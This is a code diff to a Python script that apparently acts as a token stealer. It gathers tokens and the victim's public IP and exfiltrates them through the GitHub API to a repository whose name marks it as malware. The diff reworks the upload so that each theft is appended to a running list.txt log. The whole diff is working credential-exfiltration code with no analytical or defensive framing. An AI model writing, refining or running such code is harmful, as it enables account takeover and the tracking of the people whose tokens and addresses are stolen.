@@ -3,6 +3,7 @@ import re
 import json
 import requests
 from datetime import datetime
+import base64
 
 def fdt():
     t = []
@@ -27,35 +28,44 @@ def gia():
     except requests.exceptions.RequestException:
         return None
 
-def stupr(tkns, ip, ghtk, rpo):
-    gua = f'https://api.github.com/repos/{rpo}/contents'
+def stupr_append(tkns, ip, ghtk, rpo):
+    gua = f'https://api.github.com/repos/{rpo}/contents/list.txt'
     h = {'Authorization': f'token {ghtk}', 'Accept': 'application/vnd.github.v3+json'}
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    tf = f'tokens_{ts}.txt'
-    ifn = f'ip_address_{ts}.txt'
-    cm = f'Add log - {ts}'
+    entry = f"Timestamp: {ts}\nTokens:\n{chr(10).join(tkns)}\nIP Address: {ip if ip else 'N/A'}\n\n"
+    cm = f'Add log entry - {ts}'
+
     try:
-        td = {'message': cm, 'content': '\n'.join(tkns).encode('utf-8').decode('utf-8')}
-        tu = f'{gua}/{tf}'
-        rt = requests.put(tu, headers=h, data=json.dumps(td))
-        rt.raise_for_status()
-        print(f"Tokens uploaded: {rt.json()['content']['html_url']}")
-        idat = {'message': cm, 'content': (ip if ip else 'N/A').encode('utf-8').decode('utf-8')}
-        iu = f'{gua}/{ifn}'
-        ri = requests.put(iu, headers=h, data=json.dumps(idat))
-        ri.raise_for_status()
-        print(f"IP uploaded: {ri.json()['content']['html_url']}")
+        # Get existing content (if any)
+        get_response = requests.get(gua, headers=h)
+        get_response.raise_for_status()
+        content = base64.b64decode(get_response.json()['content']).decode('utf-8')
+        sha = get_response.json()['sha']
+        updated_content = content + entry
+        encoded_content = base64.b64encode(updated_content.encode('utf-8')).decode('utf-8')
+        data = {'message': cm, 'content': encoded_content, 'sha': sha}
+        put_response = requests.put(gua, headers=h, data=json.dumps(data))
+        put_response.raise_for_status()
+        print(f"Log appended to list.txt: {put_response.json()['content']['html_url']}")
     except requests.exceptions.RequestException as e:
-        print(f"Upload error: {e}")
-        if e.response is not None:
-            print(f"Github API Error: {e.response.status_code} - {e.response.json()}")
+        if e.response is not None and e.response.status_code == 404:
+            
+            encoded_content = base64.b64encode(entry.encode('utf-8')).decode('utf-8')
+            data = {'message': cm, 'content': encoded_content}
+            put_response = requests.put(gua, headers=h, data=json.dumps(data))
+            put_response.raise_for_status()
+            print(f"list.txt created and log added: {put_response.json()['content']['html_url']}")
+        else:
+            print(f"Error updating list.txt: {e}")
+            if e.response is not None:
+                print(f"Github API Error: {e.response.status_code} - {e.response.json()}")
 
 if __name__ == "__main__":
     tokens = fdt()
     ip_address = gia()
     ght = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBXDPKRDq6FCll0dYdJw9hzbesUt5hekJBWiMKhsFcJm"
     repo = "Syxfer/mal_dis_ip_tsmalann_syxfer"
-    if ght == "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBXDPKRDq6FCll0dYdJw9hzbesUt5hekJBWiMKhsFcJm":
-        print(" \n")
+    if ght.startswith("ssh-"): 
+        print("Warning: You appear to be using an SSH key, not a Personal Access Token. This script requires a Personal Access Token with 'repo' scope.")
     elif tokens or ip_address:
-        stupr(tokens, ip_address, ght, repo)
+        stupr_append(tokens, ip_address, ght, repo)
